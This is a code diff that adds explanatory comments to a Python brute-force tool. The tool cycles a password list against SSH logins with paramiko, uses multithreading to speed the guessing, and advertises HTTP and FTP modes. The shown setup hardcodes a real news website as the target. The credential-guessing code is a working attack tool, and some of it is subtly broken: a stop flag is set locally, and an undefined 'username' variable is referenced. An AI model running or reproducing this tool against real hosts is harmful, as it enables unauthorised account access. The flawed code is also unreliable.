@@ -5,9 +5,25 @@ from art import *
 
 console=Console()
 stop_flag=0
+
+'''
+Brute_force class is related to make a 3 types of brute force: SSH, HTTP and ftp.
+We got a password list and we try all of them on our target with user we set up before.
+The main focus of the function is to get escalation to credentials by testing a lot of 
+common password options.
+'''
 class brute_force:
 
     def __init__(bf):
+        '''
+        Initialize the needed variables
+        bf.target - represent our target
+        bf.username - represent the username that we want to try on him the password list
+        bf.stop_flag - flag when we stop - means we found the password.
+        bf.passwords_bulk - the path to our password bulk
+        bf.single_password - test on manual single password
+        bf.code - Which bruteforce we want to perform
+        '''
         bf.target = ""
         bf.username= ""
         bf.stop_flag = 0
@@ -17,6 +33,14 @@ class brute_force:
 
     @staticmethod
     def entry_message():
+        '''
+        Entry message with logo and menu
+        The user will choose the current option that he want
+        to perform his brute force
+        In addition he can also import passwords list by himself
+        or check for information by pressing H
+        We MAKE PRETTY LOGO ASWELL
+        '''
         art_font = text2art("Brute Force",font='cybermedium',chr_ignore=True)
         console.print(f"[bold red]{art_font}[/bold red]")
         console.print("#" * 55, style="bold green")
@@ -32,17 +56,32 @@ class brute_force:
         console.print("[+]For Web brute force - 4")
 
     def ssh_connect(bf):
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
+        '''
+        This function is responsible for the connection try for the ssh funcition
+        we use paramiko for ssh request by forward parameters to the target.
+        In case of correct connection (good password), we will recive a message 
+        with the username and the password
+        '''
+        ssh = paramiko.SSHClient() # create the connection
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #configure policy
+        try: # try to connect to the target through port 22 with username and pw through our password bulk
             ssh.connect(bf.target,port=22, username=bf.username, password=bf.single_password)
             stop_flag = 1
             console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + bf.single_password + ' , for account: ' + username)
-        except:
+        except: # If the password not correct we move forward to the next one and close connection
             console.print( '[-] Incorrect login, the password doesn\'t match: ' + bf.single_password)
         ssh.close()
 
     def ssh_thread(bf):
+        '''
+        This function is responsible to mulithread the connection tries
+        It is important because we got a huge list of passwords and if only 1 process
+        will work everytime it will take ever.
+        Therefore this function is responsible for reading passwords from file
+        create multiple threads and send the username and the password to the function of
+        SSH_connect, therefore we are split our passwords bulk and every thread
+        doing amount of tasks.
+        '''
         if os.path.exists(bf.passwords_bulk) == False:
             console.print('[!] That dictionary/path doesnt exist')
             sys.exit(1)
@@ -61,6 +100,9 @@ class brute_force:
                 time.sleep(0.5)
         
     def init_main(bf):
+        '''
+        Here we init the function to run, we run the functions in order to the request of the user
+        '''
         bf.entry_message()
         bf.username = "test"
         bf.target = "http://www.ynet.co.il"
